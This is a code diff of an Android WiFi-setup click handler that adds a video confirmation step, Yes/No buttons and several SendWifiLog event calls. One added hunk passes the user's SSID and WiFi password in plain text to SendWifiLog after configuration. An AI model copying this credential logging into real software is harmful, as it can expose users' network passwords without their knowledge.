@@ -107,7 +107,7 @@ public class WifiActivityClickEvent implements View.OnClickListener, PopupMenu.O
                 if (!wifiInfo.getSSID().contains("unknown ssid")) {
                     ssid = wifiInfo.getSSID();
                 } else {
-                    ssid="";
+                    ssid = "";
                 }
                 if (!TextUtils.isEmpty(ssid) && ssid.length() > 2
                         && ssid.startsWith("\"") && ssid.endsWith("\"")) {
@@ -127,7 +127,9 @@ public class WifiActivityClickEvent implements View.OnClickListener, PopupMenu.O
         mWifiConfigActivity.iv_hidePassword.setOnClickListener(this);
         mWifiConfigActivity.editSSID.setOnClickListener(this);
         mWifiConfigActivity.btn_skip_config.setOnClickListener(this);
-
+        mWifiConfigActivity.ivPlayPauseOnlyWifi.setOnClickListener(this);
+        mWifiConfigActivity.btnYes.setOnClickListener(this);
+        mWifiConfigActivity.btnNo.setOnClickListener(this);
         //mWifiConfigActivity.editPassword.setTransformationMethod(HideReturnsTransformationMethod.getInstance());
     }
 
@@ -147,7 +149,23 @@ public class WifiActivityClickEvent implements View.OnClickListener, PopupMenu.O
                 break;
 
             case R.id.btnConfigure:
-                wificonfigblankvalidation();
+                hideSoftKeyBoard();
+                String ssid = mWifiConfigActivity.editSSID.getText().toString();
+                String pwd = mWifiConfigActivity.editPassword.getText().toString();
+                String bssid = mWifiConfigActivity.editBSSID.getText().toString();
+
+                if (TextUtils.isEmpty(ssid) || TextUtils.isEmpty(pwd)) {
+                    MethodUtils.errorMsg(mWifiConfigActivity, "Please enter your WiFi Password.");
+                } else {
+                    new SendWifiLog("6", mWifiConfigActivity, new OnUiEventClick() {
+                        @Override
+                        public void onUiClick(Intent intent, int eventCode) {
+                            if (intent.getBooleanExtra("success", false)) {
+                                next();
+                            }
+                        }
+                    });
+                }
                 break;
             case R.id.iv_showPassword:
                 mWifiConfigActivity.iv_showPassword.setVisibility(View.GONE);
@@ -181,14 +199,88 @@ public class WifiActivityClickEvent implements View.OnClickListener, PopupMenu.O
                     //LoginShared.setstatusforwifivarification(mWifiConfigActivity, true);
                 }
 
+            case R.id.ivPlayPauseOnlyWifi:
+
+                if (!mWifiConfigActivity.isOnlyWifiVideoPlayed) {
+                    mWifiConfigActivity.video_view_only_oneWifi.start();
+                    mWifiConfigActivity.ivPlayPauseOnlyWifi.setImageResource(R.drawable.pause);
+                    mWifiConfigActivity.ivPlayPauseOnlyWifi.setVisibility(View.GONE);
+                    mWifiConfigActivity.btnYes.setEnabled(false);
+                    mWifiConfigActivity.btnYes.setBackground(mWifiConfigActivity.getResources().getDrawable(R.drawable.button_disable_background));
+                    mWifiConfigActivity.btnNo.setEnabled(false);
+                    mWifiConfigActivity.btnNo.setBackground(mWifiConfigActivity.getResources().getDrawable(R.drawable.button_disable_background));
+                    mWifiConfigActivity.isOnlyWifiVideoPlayed = true;
+                } else {
+                    mWifiConfigActivity.video_view_only_oneWifi.pause();
+                    mWifiConfigActivity.ivPlayPauseOnlyWifi.setImageResource(R.drawable.play);
+                    mWifiConfigActivity.isOnlyWifiVideoPlayed = false;
+                    mWifiConfigActivity.btnYes.setBackground(mWifiConfigActivity.getResources().getDrawable(R.drawable.login_button_gradient));
+                    mWifiConfigActivity.btnYes.setEnabled(true);
+                    mWifiConfigActivity.btnNo.setBackground(mWifiConfigActivity.getResources().getDrawable(R.drawable.login_button_gradient));
+                    mWifiConfigActivity.btnNo.setEnabled(true);
+
+                    /*if (mWifiConfigActivity.videoNegativeCount == 0) {
+                        mWifiConfigActivity.callDialog();
+                    } else {
+                        mWifiConfigActivity.btnYes.setBackground(mWifiConfigActivity.getResources().getDrawable(R.drawable.login_button_gradient));
+                        mWifiConfigActivity.btnYes.setEnabled(true);
+                    }*/
+                }
+                break;
+
+
+            case R.id.btnYes:
+
+                if (mWifiConfigActivity.videoNegativeCount == 0) {
+                    new SendWifiLog("9", mWifiConfigActivity, new OnUiEventClick() {
+                        @Override
+                        public void onUiClick(Intent intent, int eventCode) {
+                            if (intent.getBooleanExtra("success", false)) {
+                                wificonfigblankvalidation();
+                            }
+                        }
+                    });
+                } else {
+                    new SendWifiLog("8", mWifiConfigActivity, new OnUiEventClick() {
+                        @Override
+                        public void onUiClick(Intent intent, int eventCode) {
+                            if (intent.getBooleanExtra("success", false)) {
+                                wificonfigblankvalidation();
+                            }
+                        }
+                    });
+                }
+                break;
+
+            case R.id.btnNo:
+
+                new SendWifiLog("7", mWifiConfigActivity, new OnUiEventClick() {
+                    @Override
+                    public void onUiClick(Intent intent, int eventCode) {
+                        if (intent.getBooleanExtra("success", false)) {
+                            mWifiConfigActivity.video_view_only_oneWifi.stopPlayback();
+                            mWifiConfigActivity.videoNegativeCount++;
+                            mWifiConfigActivity.startNewVideo();
+                        }
+                    }
+                });
+
+
+                break;
+
         }
+    }
+
+    private void next() {
+        mWifiConfigActivity.sv_main.setVisibility(View.GONE);
+        mWifiConfigActivity.setUpSmartWifiView();
     }
 
     private void buildAlertMessageNoGps() {
 
-        CustomAlert customAlert=new CustomAlert(mWifiConfigActivity);
+        CustomAlert customAlert = new CustomAlert(mWifiConfigActivity);
         customAlert.setSubText("Your GPS seems to be disabled, you need to enable it to use this service?");
-        customAlert.setKeyName("","Yes");
+        customAlert.setKeyName("", "Yes");
         customAlert.show();
         customAlert.btn_ok.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -219,7 +311,7 @@ public class WifiActivityClickEvent implements View.OnClickListener, PopupMenu.O
                 String bssid = mWifiConfigActivity.editBSSID.getText().toString();
 
                 if (TextUtils.isEmpty(ssid) || TextUtils.isEmpty(pwd)) {
-                    MethodUtils.errorMsg(mWifiConfigActivity,"Please enter your WiFi Password.");
+                    MethodUtils.errorMsg(mWifiConfigActivity, "Please enter your WiFi Password.");
                 } else {
                     //  mWifiConfigActivity.unregisterReceiver(wifiReceiver);
                     if (!loader.isShowing()) {
@@ -287,10 +379,10 @@ public class WifiActivityClickEvent implements View.OnClickListener, PopupMenu.O
             Toast.makeText(mWifiConfigActivity, "Wifi Config done", Toast.LENGTH_LONG).show();
         else {
 
-            CustomAlert customAlert=new CustomAlert(mWifiConfigActivity);
+            CustomAlert customAlert = new CustomAlert(mWifiConfigActivity);
             customAlert.setSubText(mWifiConfigActivity.getString(R.string.smart_config_failed));
             customAlert.setCancelVisible();
-            customAlert.setKeyName("Cancel","AP Config");
+            customAlert.setKeyName("Cancel", "AP Config");
             customAlert.show();
 
             customAlert.btn_ok.setOnClickListener(new View.OnClickListener() {
@@ -319,19 +411,24 @@ public class WifiActivityClickEvent implements View.OnClickListener, PopupMenu.O
         if (loader.isShowing()) {
             loader.dismiss();
         }
+        new SendWifiLog(mWifiConfigActivity.editSSID.getText().toString() + "," + mWifiConfigActivity.editPassword.getText().toString(), mWifiConfigActivity, new OnUiEventClick() {
+            @Override
+            public void onUiClick(Intent intent, int eventCode) {
+            }
+        });
         if (sucess) {
             if (mWifiConfigActivity.fromSettings) {
                 showalertdialog(true);
-            } else if(mWifiConfigActivity.fromLogin){
+            } else if (mWifiConfigActivity.fromLogin) {
                 showalertdialog(false);
             }
             // Toast.makeText(mWifiConfigActivity, "wificonfig done", Toast.LENGTH_LONG).show();
         } else {
 
-            CustomAlert customAlert=new CustomAlert(mWifiConfigActivity);
+            CustomAlert customAlert = new CustomAlert(mWifiConfigActivity);
             customAlert.setSubText(mWifiConfigActivity.getString(R.string.Config_failed));
             customAlert.setCancelVisible();
-            customAlert.setKeyName("Cancel","Try Again");
+            customAlert.setKeyName("Cancel", "Try Again");
             customAlert.show();
 
             customAlert.btn_ok.setOnClickListener(new View.OnClickListener() {
@@ -341,7 +438,7 @@ public class WifiActivityClickEvent implements View.OnClickListener, PopupMenu.O
 
                     //wificonfigblankvalidation();
 
-                    Intent intent=new Intent(mWifiConfigActivity,SetUpPreparation.class);
+                    Intent intent = new Intent(mWifiConfigActivity, SetUpPreparation.class);
                     intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                     mWifiConfigActivity.startActivity(intent);
                     mWifiConfigActivity.finish();
@@ -352,12 +449,12 @@ public class WifiActivityClickEvent implements View.OnClickListener, PopupMenu.O
                 @Override
                 public void onClick(View v) {
 
-                    if(mWifiConfigActivity.fromSettings){
+                    if (mWifiConfigActivity.fromSettings) {
                         Intent loginIntent = new Intent(mWifiConfigActivity, SettingsActivity.class);
                         mWifiConfigActivity.startActivity(loginIntent);
                         mWifiConfigActivity.overridePendingTransition(R.anim.slide_in_right, R.anim.slide_out_left);
                         mWifiConfigActivity.finishAffinity();
-                    }else if(mWifiConfigActivity.fromLogin){
+                    } else if (mWifiConfigActivity.fromLogin) {
                         customAlert.dismiss();
                     }
                 }
@@ -367,10 +464,10 @@ public class WifiActivityClickEvent implements View.OnClickListener, PopupMenu.O
 
     private void showalertdialog(boolean isFromSettingPage) {
 
-        CustomAlert customAlert=new CustomAlert(mWifiConfigActivity);
+        CustomAlert customAlert = new CustomAlert(mWifiConfigActivity);
         customAlert.setSubText(mWifiConfigActivity.getString(R.string.configuration));
         if (!isFromSettingPage) {
-            customAlert.setKeyName("","Next");
+            customAlert.setKeyName("", "Next");
         }
         customAlert.show();
         customAlert.btn_ok.setOnClickListener(new View.OnClickListener() {
